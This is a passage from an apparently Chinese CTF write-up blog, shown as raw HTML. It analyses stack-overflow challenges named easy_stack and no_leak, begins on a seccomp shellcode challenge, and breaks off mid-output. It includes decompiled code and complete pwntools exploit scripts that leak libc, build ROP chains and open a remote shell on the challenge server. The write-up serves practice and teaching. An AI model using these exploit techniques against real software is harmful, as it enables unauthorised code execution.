class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *__fastcall <span class="title">read_n</span><span class="params">(<span class="keyword">void</span> *a1, <span class="keyword">unsigned</span> __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">520</span>]; <span class="comment">// [rsp+10h] [rbp-210h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [rsp+218h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [rsp+21Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a2 &gt; <span class="number">0x200</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;too long!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    read(<span class="number">0</span>, &amp;s[v6], <span class="number">1uLL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( s[v6] == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !s[v6] )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v2 = v6++;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( a2 &gt; v2 );</span><br><span class="line">  <span class="keyword">if</span> ( s[v6] == <span class="number">10</span> &amp;&amp; a2 &gt; v6 )</span><br><span class="line">    s[v6] = <span class="number">0</span>;</span><br><span class="line">  v5 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">memcpy</span>(a1, s, v5);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到存在明显的栈溢出漏洞。不过比较棘手的是程序开启了PIE导致我们无法多次利用此漏洞，所以我们目前来看迫切需要的就是重复多次扩大漏洞。</p><p>在栈方面比较熟知扩大漏洞的方法是<code>fini_array</code>劫持，不过这里不存在任意写所以无法实现。</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000000007C0                               public _start</span><br><span class="line">.text:00000000000007C0                               _start proc near                        ; DATA XREF: LOAD:0000000000000018↑o</span><br><span class="line">.text:00000000000007C0                               ; __unwind &#123;</span><br><span class="line">.text:00000000000007C0 31 ED                         xor     ebp, ebp</span><br><span class="line">.text:00000000000007C2 49 89 D1                      mov     r9, rdx                         ; rtld_fini</span><br><span class="line">.text:00000000000007C5 5E                            pop     rsi                             ; argc</span><br><span class="line">.text:00000000000007C6 48 89 E2                      mov     rdx, rsp                        ; ubp_av</span><br><span class="line">.text:00000000000007C9 48 83 E4 F0                   and     rsp, 0FFFFFFFFFFFFFFF0h</span><br><span class="line">.text:00000000000007CD 50                            push    rax</span><br><span class="line">.text:00000000000007CE 54                            push    rsp                             ; stack_end</span><br><span class="line">.text:00000000000007CF 4C 8D 05 FA 02 00 00          lea     r8, __libc_csu_fini             ; fini</span><br><span class="line">.text:00000000000007D6 48 8D 0D 83 02 00 00          lea     rcx, __libc_csu_init            ; init</span><br><span class="line">.text:00000000000007DD 48 8D 3D E0 01 00 00          lea     rdi, main                       ; main</span><br><span class="line">.text:00000000000007E4 FF 15 F6 07 20 00             call    cs:__libc_start_main_ptr</span><br><span class="line">.text:00000000000007E4</span><br><span class="line">.text:00000000000007EA F4                            hlt</span><br><span class="line">.text:00000000000007EA                               ; &#125; // starts at 7C0</span><br><span class="line">.text:00000000000007EA</span><br><span class="line">.text:00000000000007EA                               _start endp</span><br></pre></td></tr></table></figure><p>总所周知，程序的入口是<code>_start</code>函数，并且我们知道这里的执行顺序是<code>__libc_csu_init</code>=&gt;<code>main</code>=&gt;<code>__libc_csu_fini</code></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20221013152012744.png"                      alt="image-20221013152012744"                ></p><p>可以看到在进入函数不过多久就开始调用了<code>_libc_csu_init</code>，并且把main地址放在了<code>rsp+0x18</code>位置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000021A35                 lea     rdi, [rsp+0B8h+var_98] ; env</span><br><span class="line">.text:0000000000021A3A                 call    _setjmp</span><br><span class="line">.text:0000000000021A3F                 test    eax, eax</span><br><span class="line">.text:0000000000021A41                 jnz     short loc_21A8E</span><br><span class="line">.text:0000000000021A43                 mov     rax, fs:300h</span><br><span class="line">.text:0000000000021A4C                 mov     [rsp+0B8h+var_50], rax</span><br><span class="line">.text:0000000000021A51                 mov     rax, fs:2F8h</span><br><span class="line">.text:0000000000021A5A                 mov     [rsp+0B8h+var_48], rax</span><br><span class="line">.text:0000000000021A5F                 lea     rax, [rsp+0B8h+var_98]</span><br><span class="line">.text:0000000000021A64                 mov     fs:300h, rax</span><br><span class="line">.text:0000000000021A6D                 mov     rax, cs:environ_ptr</span><br><span class="line">.text:0000000000021A74                 mov     rsi, [rsp+8]</span><br><span class="line">.text:0000000000021A79                 mov     edi, [rsp+14h]</span><br><span class="line">.text:0000000000021A7D                 mov     rdx, [rax]</span><br><span class="line">.text:0000000000021A80                 mov     rax, [rsp+18h]</span><br><span class="line">.text:0000000000021A85                 call    rax</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20221013153034952.png"                      alt="image-20221013153034952"                ></p><p>随后调用main函数，然后从main函数返回时的ret地址自然而然成了call的下一行。所以如果我们可以覆盖末尾字节为<code>0x80</code>即可重新进入main函数达到扩大漏洞的效果。</p><h3 id="综上，exp"><a href="#综上，exp" class="headerlink" title="综上，exp"></a>综上，exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./easy_stack&#x27;</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./easy_stack&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&#x27;nc.eonew.cn&#x27;</span>, <span class="number">10004</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span>+p16(<span class="number">0x80</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span>)</span><br><span class="line">libc_base = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x21A80</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span> + flat(libc_base+<span class="number">0x415a6</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="no-leak"><a href="#no-leak" class="headerlink" title="no leak"></a>no leak</h2><h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><p>这里吐槽一下这个平台，给的libc不是常见libc，并且也不给ld文件，上面一道可以泄漏还好这个无法泄漏只能爆破偏移，太浪费时间了，基本就是盲调。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">128</span>]; <span class="comment">// [rsp+0h] [rbp-80h] BYREF</span></span><br><span class="line"></span><br><span class="line">  alarm(<span class="number">0x3C</span>u);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>题目很简单，就只有简单的栈溢出，并且不存在任何的输出函数。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20221014184632346.png"                      alt="image-20221014184632346"                ></p><p>这里还有一个吐槽点，因为程序保护是<code>Full RELRO</code>所以走ret2resolve是行不通的，所以下意识就是去找gadget。这里的吐槽点就是在ida和ROPgadget里面都找到有用的gadget是在ropper导出的内容才找到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0000000000400518: add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret</span><br></pre></td></tr></table></figure><p>这里依旧需要熟知程序的运行机制，在上面一道题中我们提到了，程序开始时<code>_start</code>=&gt;<code>__libc_start_main</code>=&gt;<code>main</code>，在最后这里进入main时是用call进入的，所以会在栈上残留下<code>__libc_start_main+231</code>的地址，不过这里因为我们要持续劫持执行流所以我们不能利用这里，不过这里依旧存在很多可以用的，这里就不再赘述，可以自己看一下<code>__libc_start_main</code>的函数代码。</p><h3 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h3><p>看得出来上面的gadget是可以修改任意地址上内容的值，所以如果我们在已知地址上放上libc地址即可根据偏移得到system的地址，最后通过csu来call已知位置即可。</p><p>最后得出的思路就是：</p><p><code>栈迁移到bss段</code>=&gt;<code>在bss布置rop进行csu调用__libc_start_main</code>=&gt;<code>在__libc_start_main中调用read覆盖栈</code>=&gt;<code>使用gadget修改残留位置指向system并用csu调用</code></p><h3 id="综上，exp-1"><a href="#综上，exp-1" class="headerlink" title="综上，exp"></a>综上，exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./no_leak&#x27;</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./no_leak&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&#x27;nc.eonew.cn&#x27;</span>, <span class="number">10002</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">bss = elf.bss()+<span class="number">0x500</span></span><br><span class="line">main = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">_start = <span class="number">0x400474</span></span><br><span class="line">pop_rdi = <span class="number">0x00000000004005d3</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x00000000004005d1</span></span><br><span class="line"><span class="comment"># add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret</span></span><br><span class="line">gadget = <span class="number">0x0000000000400518</span></span><br><span class="line">pop_rbp = <span class="number">0x00000000004004b8</span></span><br><span class="line">pop_rbx_rbp_r12_r13_r14_r15 = <span class="number">0x4005CA</span></span><br><span class="line">one_gadget = <span class="number">0x41720</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(r, &#x27;b*&#x27;+hex(elf.plt[&#x27;read&#x27;]))</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x80</span>+flat(bss, pop_rdi, <span class="number">0</span>, pop_rsi_r15,</span><br><span class="line">                         bss, <span class="number">0</span>, elf.plt[<span class="string">&#x27;read&#x27;</span>], <span class="number">0x400564</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">payload = flat(<span class="number">0x196082</span>, <span class="number">0x4005CA</span>, (one_gadget-<span class="number">0x21a87</span>)-<span class="number">1</span>, (one_gadget-<span class="number">0x21a87</span>),</span><br><span class="line">               (<span class="number">0x601558</span> - (((one_gadget-<span class="number">0x21a87</span>)-<span class="number">1</span>)*<span class="number">8</span>)), elf.symbols[<span class="string">&#x27;read&#x27;</span>], <span class="number">0</span>, <span class="number">0x601488</span>, <span class="number">0x4005B0</span>, _start)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">bin_sh_addr = <span class="number">0x601488</span>+<span class="number">0x90</span>+<span class="number">8</span></span><br><span class="line">payload = flat(pop_rbx_rbp_r12_r13_r14_r15,</span><br><span class="line">               -<span class="number">0x371f08</span>, [<span class="number">0</span>]*<span class="number">5</span>, pop_rbp, <span class="number">0x601448</span>+<span class="number">0x3d</span>, gadget, <span class="number">0x4005CA</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0x601448</span>, bin_sh_addr, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x0000000000400416</span>, <span class="number">0x4005B0</span>)</span><br><span class="line">payload += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># r.sendline(p64(main))</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h2><p>在以往遇到沙箱的问题都是使用ORW，并且只是常规的进行调用，并没有更加深层次的讨论。这里就借此题目更加深入讨论一下在CTF中常见的沙箱保护以及绕过方式。</p><h3 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __noreturn <span class="title">start</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// r10</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> *v5; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v6; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v7; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// r12d</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// r13d</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v10; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v11; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 arg3[<span class="number">2</span>]; <span class="comment">// [rsp+80h] [rbp-80h] BYREF</span></span><br><span class="line">  __int16 v13; <span class="comment">// [rsp+90h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v14; <span class="comment">// [rsp+92h] [rbp-6Eh]</span></span><br><span class="line">  <span class="keyword">char</span> v15; <span class="comment">// [rsp+93h] [rbp-6Dh]</span></span><br><span class="line">  <span class="keyword">int</span> v16; <span class="comment">// [rsp+94h] [rbp-6Ch]</span></span><br><span class="line">  __int16 v17; <span class="comment">// [rsp+98h] [rbp-68h]</span></span><br><span class="line">  <span class="keyword">char</span> v18; <span class="comment">// [rsp+9Ah] [rbp-66h]</span></span><br><span class="line">  <span class="keyword">char</span> v19; <span class="comment">// [rsp+9Bh] [rbp-65h]</span></span><br><span class="line">  <span class="keyword">int</span> v20; <span class="comment">// [rsp+9Ch] [rbp-64h]</span></span><br><span class="line">  __int16 v21; <span class="comment">// [rsp+A0h] [rbp-60h]</span></span><br><span class="line">  <span class="keyword">char</span> v22; <span class="comment">// [rsp+A2h] [rbp-5Eh]</span></span><br><span class="line">  <span class="keyword">char</span> v23; <span class="comment">// [rsp+A3h] [rbp-5Dh]</span></span><br><span class="line">  <span class="keyword">int</span> v24; <span class="comment">// [rsp+A4h] [rbp-5Ch]</span></span><br><span class="line">  __int16 v25; <span class="comment">// [rsp+A8h] [rbp-58h]</span></span><br><span class="line">  <span class="keyword">char</span> v26; <span class="comment">// [rsp+AAh] [rbp-56h]</span></span><br><span class="line">  <span class="keyword">char</span> v27; <span class="comment">// [rsp+ABh] [rbp-55h]</span></span><br><span class="line">  <span class="keyword">int</span> v28; <span class="comment">// [rsp+ACh] [rbp-54h]</span></span><br><span class="line">  __int16 v29; <span class="comment">// [rsp+B0h] [rbp-50h]</span></span><br><span class="line">  <span class="keyword">char</span> v30; <span class="comment">// [rsp+B2h] [rbp-4Eh]</span></span><br><span class="line">  <span class="keyword">char</span> v31; <span class="comment">// [rsp+B3h] [rbp-4Dh]</span></span><br><span class="line">  <span class="keyword">int</span> v32; <span class="comment">// [rsp+B4h] [rbp-4Ch]</span></span><br><span class="line">  __int16 v33; <span class="comment">// [rsp+B8h] [rbp-48h]</span></span><br><span class="line">  <span class="keyword">char</span> v34; <span class="comment">// [rsp+BAh] [rbp-46h]</span></span><br><span class="line">  <span class="keyword">char</span> v35; <span class="comment">// [rsp+BBh] [rbp-45h]</span></span><br><span class="line">  <span class="keyword">int</span> v36; <span class="comment">// [rsp+BCh] [rbp-44h]</span></span><br><span class="line">  __int16 v37; <span class="comment">// [rsp+C0h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">char</span> v38; <span class="comment">// [rsp+C2h] [rbp-3Eh]</span></span><br><span class="line">  <span class="keyword">char</span> v39; <span class="comment">// [rsp+C3h] [rbp-3Dh]</span></span><br><span class="line">  <span class="keyword">int</span> v40; <span class="comment">// [rsp+C4h] [rbp-3Ch]</span></span><br><span class="line">  __int16 v41; <span class="comment">// [rsp+C8h] [rbp-38h]</span></span><br><span class="line">  <span class="keyword">char</span> v42; <span class="comment">// [rsp+CAh] [rbp-36h]</span></span><br><span class="line">  <span class="keyword">char</span> v43; <span class="comment">// [rsp+CBh] [rbp-35h]</span></span><br><span class="line">  <span class="keyword">int</span> v44; <span class="comment">// [rsp+CCh] [rbp-34h]</span></span><br><span class="line">  __int16 v45; <span class="comment">// [rsp+D0h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">char</span> v46; <span class="comment">// [rsp+D2h] [rbp-2Eh]</span></span><br><span class="line">  <span class="keyword">char</span> v47; <span class="comment">// [rsp+D3h] [rbp-2Dh]</span></span><br><span class="line">  <span class="keyword">int</span> v48; <span class="comment">// [rsp+D4h] [rbp-2Ch]</span></span><br><span class="line"></span><br><span class="line">  v13 = <span class="number">32</span>;</span><br><span class="line">  v14 = <span class="number">0</span>;</span><br><span class="line">  v15 = <span class="number">0</span>;</span><br><span class="line">  v16 = <span class="number">0</span>;</span><br><span class="line">  v17 = <span class="number">21</span>;</span><br><span class="line">  v18 = <span class="number">6</span>;</span><br><span class="line">  v19 = <span class="number">0</span>;</span><br><span class="line">  v20 = <span class="number">5</span>;</span><br><span class="line">  v21 = <span class="number">21</span>;</span><br><span class="line">  v22 = <span class="number">5</span>;</span><br><span class="line">  v23 = <span class="number">0</span>;</span><br><span class="line">  v24 = <span class="number">37</span>;</span><br><span class="line">  v25 = <span class="number">21</span>;</span><br><span class="line">  v26 = <span class="number">4</span>;</span><br><span class="line">  v27 = <span class="number">0</span>;</span><br><span class="line">  v28 = <span class="number">1</span>;</span><br><span class="line">  v29 = <span class="number">21</span>;</span><br><span class="line">  v30 = <span class="number">3</span>;</span><br><span class="line">  v31 = <span class="number">0</span>;</span><br><span class="line">  v32 = <span class="number">0</span>;</span><br><span class="line">  v33 = <span class="number">21</span>;</span><br><span class="line">  v34 = <span class="number">2</span>;</span><br><span class="line">  v35 = <span class="number">0</span>;</span><br><span class="line">  v36 = <span class="number">9</span>;</span><br><span class="line">  v37 = <span class="number">21</span>;</span><br><span class="line">  v38 = <span class="number">1</span>;</span><br><span class="line">  v39 = <span class="number">0</span>;</span><br><span class="line">  v40 = <span class="number">231</span>;</span><br><span class="line">  v41 = <span class="number">6</span>;</span><br><span class="line">  v42 = <span class="number">0</span>;</span><br><span class="line">  v43 = <span class="number">0</span>;</span><br><span class="line">  v44 = <span class="number">0</span>;</span><br><span class="line">  v45 = <span class="number">6</span>;</span><br><span class="line">  v46 = <span class="number">0</span>;</span><br><span class="line">  v47 = <span class="number">0</span>;</span><br><span class="line">  v48 = <span class="number">2147418112</span>;</span><br><span class="line">  LOWORD(arg3[<span class="number">0</span>]) = <span class="number">9</span>;</span><br><span class="line">  arg3[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int64)&amp;v13;</span><br><span class="line">  v0 = sys_alarm(<span class="number">0x3C</span>u);</span><br><span class="line">  v1 = sys_write(<span class="number">1u</span>, <span class="string">&quot;---------- Shellcode ----------\n&quot;</span>, <span class="number">0x20</span>uLL);</span><br><span class="line">  v2 = sys_prctl(<span class="number">38</span>, <span class="number">1uLL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  v4 = sys_prctl(<span class="number">22</span>, <span class="number">2uLL</span>, (<span class="keyword">unsigned</span> __int64)arg3, v3);</span><br><span class="line">  v5 = (<span class="keyword">char</span> *)sys_mmap(<span class="number">0LL</span>, <span class="number">0x1000</span>uLL, <span class="number">7uLL</span>, <span class="number">0x22</span>uLL, <span class="number">0xFFFFFFFF</span>uLL, <span class="number">0LL</span>);</span><br><span class="line">  v6 = sys_write(<span class="number">1u</span>, <span class="string">&quot;Input your shellcode: &quot;</span>, <span class="number">0x16</span>uLL);</span><br><span class="line">  v7 = sys_read(<span class="number">0</span>, v5, <span class="number">0x1000</span>uLL);</span><br><span class="line">  v8 = v7;</span><br><span class="line">  <span class="keyword">if</span> ( v5[(<span class="keyword">int</span>)v7 - <span class="number">1</span>] == <span class="number">10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v5[(<span class="keyword">int</span>)v7 - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    v8 = v7 - <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v8; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v5[i] &lt;= <span class="number">0x1F</span> || v5[i] == <span class="number">0x7F</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v10 = sys_write(<span class="number">1u</span>, <span class="string">&quot;Check!\n&quot;</span>, <span class="number">7uLL</span>);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  ((<span class="keyword">void</span> (*)(<span class="keyword">void</span>))v5)();</span><br><span class="line">LABEL_10:</span><br><span class="line">  v11 = sys_exit_group(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>题目很简单，限制了输入的shellcode为可见字符，这里虽然ida翻译为了<code>if ( v5[i] &lt;= 0x1F || v5[i] == 0x7F )</code>不过在实际调试过程中发现就是不允许大于<code>0x7f</code>，上面开启了sandbox。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@0df3326fd7c0:/ctf/work/download <span class="comment"># seccomp-tools dump 